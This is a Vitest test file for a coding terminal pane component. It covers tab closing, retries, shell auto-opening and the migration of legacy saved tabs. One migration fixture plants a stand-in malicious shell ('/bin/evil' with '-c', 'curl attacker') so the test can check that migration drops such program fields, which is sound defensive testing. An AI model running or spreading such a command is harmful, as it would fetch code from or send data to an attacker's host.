/** @vitest-environment jsdom */

import {
  act,
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
} from '@testing-library/react';
import { beforeEach, expect, test, vi } from 'vitest';
import { CodingTerminalPane } from '../CodingTerminalPane';

const { closeProjectTerminal, connections, server } = vi.hoisted(() => ({
  closeProjectTerminal: vi.fn(),
  /** What `useACPConnections` answers: the agent kinds, or not yet. */
  connections: { data: [] as unknown[], isPending: false },
  /** The server's terminal session list for the Project binding. */
  server: {
    records: [] as Record<string, unknown>[],
    list: vi.fn(),
  },
}));
const SHELL_ONE = '11111111-1111-4111-8111-111111111111';
const AGENT_ONE = '22222222-2222-4222-8222-222222222222';
const running = (terminalId: string, extra: object = {}) => ({
  terminalId,
  projectId: 'project-a-id',
  bindingKey: 'project',
  status: 'running',
  createdAt: 1,
  ...extra,
});

vi.mock('@kontourai/station-sdk', () => ({ closeProjectTerminal }));
vi.mock('../../../contexts/ApiBaseContext', () => ({
  useApiBase: () => ({ apiBase: 'http://station.test' }),
}));
vi.mock('../../../hooks/useACPConnections', () => ({
  useACPConnections: () => connections,
}));
vi.mock('../../acp-connections/ACPChatPanel', () => ({
  ACPChatPanel: () => (
    <div>Agent chat remains detached from terminal renderer</div>
  ),
}));
vi.mock('../TerminalPanel', () => ({
  TerminalPanel: () => <div>Terminal renderer without a snapshot</div>,
}));
vi.mock('../../../contexts/ProjectsContext', () => ({
  useProject: (slug: string) => ({ project: { id: `${slug}-id` } }),
}));
vi.mock('../terminalSessionStore', () => ({
  useTerminalSessionStore: () => server,
}));

beforeEach(() => {
  closeProjectTerminal.mockReset();
  sessionStorage.clear();
  connections.data = [];
  connections.isPending = false;
  server.records = [];
  server.list.mockReset().mockImplementation(async () => server.records);
});

function renderPane(tabs: unknown[]) {
  sessionStorage.setItem(
    'coding-terminal-tabs:v2:project-a',
    JSON.stringify(tabs),
  );
  sessionStorage.setItem(
    'coding-terminal-active-tab:v2:project-a',
    (tabs[0] as any)?.id ?? '',
  );
  return render(
    <CodingTerminalPane
      presentation="pane"
      projectSlug="project-a"
      workingDir="/workspace"
    />,
  );
}

test('keeps a terminal tab until project-bound close succeeds before any renderer snapshot', async () => {
  let resolveClose: ((value: unknown) => void) | undefined;
  closeProjectTerminal.mockReturnValue(
    new Promise((resolve) => {
      resolveClose = resolve;
    }),
  );
  server.records = [running(SHELL_ONE)];
  renderPane([
    {
      id: 'terminal-one',
      type: 'shell',
      label: 'Shell 1',
      terminalId: SHELL_ONE,
    },
  ]);
  await waitFor(() => expect(server.list).toHaveBeenCalled());

  fireEvent.click(screen.getByRole('button', { name: 'Close Shell 1' }));

  expect(closeProjectTerminal).toHaveBeenCalledWith(
    'http://station.test',
    'project-a',
    SHELL_ONE,
  );
  expect(screen.getByRole('tab', { name: 'Shell 1' })).toBeTruthy();
  expect(
    screen.getByRole('button', { name: 'Closing Shell 1' }),
  ).toHaveProperty('disabled', true);

  await act(async () => {
    resolveClose?.({
      sessionId: 'project-a:terminal-one',
      projectSlug: 'project-a',
      terminalId: 'terminal-one',
    });
  });

  await waitFor(() =>
    expect(screen.queryByRole('tab', { name: 'Shell 1' })).toBeNull(),
  );
});

test('terminates an agent terminal after its chat view detached and exposes a retryable error', async () => {
  closeProjectTerminal
    .mockRejectedValueOnce(new Error('Station is unavailable'))
    .mockResolvedValueOnce({
      sessionId: 'project-a:agent-one',
      projectSlug: 'project-a',
      terminalId: 'agent-one',
    });
  server.records = [
    running(AGENT_ONE, {
      launch: { kind: 'agent', connectionId: 'alpha', mode: 'code' },
    }),
  ];
  renderPane([
    {
      id: 'agent-one',
      type: 'agent',
      label: 'Agent: alpha',
      agentSlug: 'alpha',
      mode: 'chat',
      terminalId: AGENT_ONE,
    },
  ]);
  await waitFor(() => expect(server.list).toHaveBeenCalled());

  expect(
    screen.getByText('Agent chat remains detached from terminal renderer'),
  ).toBeTruthy();
  expect(screen.queryByText('Terminal renderer without a snapshot')).toBeNull();

  fireEvent.click(screen.getByRole('button', { name: 'Close Agent: alpha' }));
  await screen.findByRole('alert');
  expect(screen.getByRole('tab', { name: 'Agent: alpha' })).toBeTruthy();
  expect(screen.getByRole('alert').textContent).toContain(
    'Station is unavailable',
  );

  fireEvent.click(screen.getByRole('button', { name: 'Retry close' }));
  await waitFor(() =>
    expect(screen.queryByRole('tab', { name: 'Agent: alpha' })).toBeNull(),
  );
  expect(closeProjectTerminal).toHaveBeenNthCalledWith(
    1,
    'http://station.test',
    'project-a',
    AGENT_ONE,
  );
  expect(closeProjectTerminal).toHaveBeenNthCalledWith(
    2,
    'http://station.test',
    'project-a',
    AGENT_ONE,
  );
});

// ── Design audit U7: one kind of terminal means a shell, not a picker.
const agentConnection = {
  id: 'alpha',
  name: 'Alpha',
  status: 'available',
  modes: ['code'],
};

test('an open, empty terminal opens a shell when the shell is the only kind; "+" opens another without a picker', async () => {
  renderPane([]);
  expect(await screen.findByRole('tab', { name: 'Shell 1' })).toBeTruthy();
  expect(screen.queryByRole('dialog', { name: 'New terminal' })).toBeNull();
  fireEvent.click(screen.getByTitle('New terminal'));
  expect(screen.getByRole('tab', { name: 'Shell 2' })).toBeTruthy();
  expect(screen.queryByRole('dialog', { name: 'New terminal' })).toBeNull();
});

test('with an agent kind as well, nothing opens by itself and "+" is the picker', async () => {
  connections.data = [agentConnection];
  renderPane([]);
  await act(async () => undefined);
  expect(screen.queryByRole('tab')).toBeNull();
  fireEvent.click(screen.getByRole('button', { name: '+ New Terminal' }));
  expect(screen.getByRole('dialog', { name: 'New terminal' })).toBeTruthy();
});

test('while the kinds are still unknown nothing opens by itself, and a shell follows once they are', async () => {
  connections.isPending = true;
  const view = renderPane([]);
  await act(async () => undefined);
  expect(screen.queryByRole('tab')).toBeNull();
  connections.isPending = false;
  view.rerender(
    <CodingTerminalPane
      presentation="pane"
      projectSlug="project-a"
      workingDir="/workspace"
    />,
  );
  expect(await screen.findByRole('tab', { name: 'Shell 1' })).toBeTruthy();
});

test('a terminal closed in the Coding layout stays closed: the shell opens only once the panel is open', async () => {
  const view = render(
    <CodingTerminalPane
      presentation="layout"
      terminalOpen={false}
      projectSlug="project-a"
      workingDir="/workspace"
    />,
  );
  await act(async () => undefined);
  expect(screen.queryByRole('tab')).toBeNull();
  view.rerender(
    <CodingTerminalPane
      presentation="layout"
      terminalOpen
      projectSlug="project-a"
      workingDir="/workspace"
    />,
  );
  expect(await screen.findByRole('tab', { name: 'Shell 1' })).toBeTruthy();
});

test('closing the last terminal is remembered: a remount opens no shell, and opening one again forgets it', async () => {
  closeProjectTerminal.mockResolvedValue({
    sessionId: 'project-a:terminal-one',
    projectSlug: 'project-a',
    terminalId: 'terminal-one',
  });
  const first = renderPane([
    { id: 'terminal-one', type: 'shell', label: 'Shell 1' },
  ]);
  await waitFor(() => expect(server.list).toHaveBeenCalled());
  fireEvent.click(screen.getByRole('button', { name: 'Close Shell 1' }));
  await waitFor(() => expect(screen.queryByRole('tab')).toBeNull());
  // No shell opens in the empty panel the reader just emptied.
  await act(async () => undefined);
  expect(screen.queryByRole('tab')).toBeNull();
  first.unmount();
  // A remount (a reload, a fold crossing): still none.
  const second = render(
    <CodingTerminalPane
      presentation="pane"
      projectSlug="project-a"
      workingDir="/workspace"
    />,
  );
  await act(async () => undefined);
  expect(screen.queryByRole('tab')).toBeNull();
  fireEvent.click(screen.getByRole('button', { name: '+ New Terminal' }));
  expect(screen.getByRole('tab', { name: 'Shell 1' })).toBeTruthy();
  second.unmount();
  // Opened again by hand: a later empty remount opens one as before.
  sessionStorage.setItem('coding-terminal-tabs:v2:project-a', '[]');
  render(
    <CodingTerminalPane
      presentation="pane"
      projectSlug="project-a"
      workingDir="/workspace"
    />,
  );
  expect(await screen.findByRole('tab', { name: 'Shell 1' })).toBeTruthy();
});

test('closing the last terminal is remembered per Project: another Project’s empty panel still opens a shell', async () => {
  closeProjectTerminal.mockResolvedValue({
    sessionId: 'project-a:terminal-one',
    projectSlug: 'project-a',
    terminalId: 'terminal-one',
  });
  const inA = renderPane([
    { id: 'terminal-one', type: 'shell', label: 'Shell 1' },
  ]);
  await waitFor(() => expect(server.list).toHaveBeenCalled());
  fireEvent.click(screen.getByRole('button', { name: 'Close Shell 1' }));
  await waitFor(() => expect(screen.queryByRole('tab')).toBeNull());
  inA.unmount();
  // Project B keeps its own tab list: its panel was never emptied by the
  // reader, so it opens a shell.
  expect(sessionStorage.getItem('coding-terminal-tabs:v2:project-a')).toBe(
    '[]',
  );
  expect(
    sessionStorage.getItem('coding-terminal-tabs:v2:project-b'),
  ).toBeNull();
  const inB = render(
    <CodingTerminalPane
      presentation="pane"
      projectSlug="project-b"
      workingDir="/workspace-b"
    />,
  );
  expect(await screen.findByRole('tab', { name: 'Shell 1' })).toBeTruthy();
  inB.unmount();
  // Back in Project A with an empty list: still the reader's closed panel.
  render(
    <CodingTerminalPane
      presentation="pane"
      projectSlug="project-a"
      workingDir="/workspace"
    />,
  );
  await act(async () => undefined);
  expect(screen.queryByRole('tab')).toBeNull();
});

test('saved pre-socket tabs migrate once: labels kept, history named for import, programs dropped', async () => {
  sessionStorage.setItem(
    'coding-terminal-tabs',
    JSON.stringify([
      { id: 'term-1700000000000', type: 'shell', label: 'Build shell' },
      {
        id: 'term-1700000000001',
        type: 'agent',
        label: 'Agent: code',
        agentSlug: 'alpha-code',
        agentMode: 'code',
        connectionId: 'alpha',
        mode: 'terminal',
        shell: '/bin/evil',
        shellArgs: ['-c', 'curl attacker'],
      },
    ]),
  );
  sessionStorage.setItem('coding-terminal-active-tab', 'term-1700000000000');
  render(
    <CodingTerminalPane
      presentation="pane"
      projectSlug="project-a"
      workingDir="/workspace"
    />,
  );
  expect(await screen.findByRole('tab', { name: 'Build shell' })).toBeTruthy();
  expect(sessionStorage.getItem('coding-terminal-tabs')).toBeNull();
  expect(sessionStorage.getItem('coding-terminal-active-tab')).toBeNull();
  const migrated = JSON.parse(
    sessionStorage.getItem('coding-terminal-tabs:v2:project-a')!,
  );
  expect(migrated).toEqual([
    {
      id: 'term-1700000000000',
      type: 'shell',
      label: 'Build shell',
      legacyTerminalId: 'term-1700000000000',
    },
    {
      id: 'term-1700000000001',
      type: 'agent',
      label: 'Agent: code',
      agentSlug: 'alpha-code',
      agentMode: 'code',
      connectionId: 'alpha',
      mode: 'terminal',
      legacyTerminalId: 'term-1700000000001',
    },
  ]);
  // Read once: another Project never sees the old tabs.
  cleanup();
  render(
    <CodingTerminalPane
      presentation="pane"
      projectSlug="project-b"
      workingDir="/workspace-b"
    />,
  );
  await act(async () => undefined);
  expect(screen.queryByRole('tab', { name: 'Build shell' })).toBeNull();
});

test("the server list is the tab source: another device's session appears and a retired one goes", async () => {
  server.records = [
    running(AGENT_ONE, {
      launch: { kind: 'agent', connectionId: 'alpha', mode: 'code' },
    }),
  ];
  renderPane([
    {
      id: 'gone',
      type: 'shell',
      label: 'Retired shell',
      terminalId: SHELL_ONE,
    },
  ]);
  expect(await screen.findByRole('tab', { name: 'Agent: code' })).toBeTruthy();
  expect(server.list).toHaveBeenCalledWith({
    projectId: 'project-a-id',
    bindingKey: 'project',
  });
  await waitFor(() =>
    expect(screen.queryByRole('tab', { name: 'Retired shell' })).toBeNull(),
  );
});
